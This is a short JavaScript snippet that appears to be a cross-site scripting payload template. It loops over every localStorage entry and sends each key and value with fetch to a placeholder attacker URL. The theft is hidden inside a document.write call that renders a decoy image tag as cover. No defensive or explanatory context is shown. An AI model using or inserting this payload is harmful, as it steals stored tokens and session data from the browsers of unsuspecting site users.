function getValuesAndKey() {
    document.write(`<img src="${((async() => {
        for (let i = 0; i < localStorage.length; i++) {
          await fetch("add-url-attack" +localStorage.key(i)+ "-" +localStorage.getItem(localStorage.key(i)));
        } 
        })() == Object) ? "add-url-img-facade":"add-url-img-facade"}" >`);
 }
 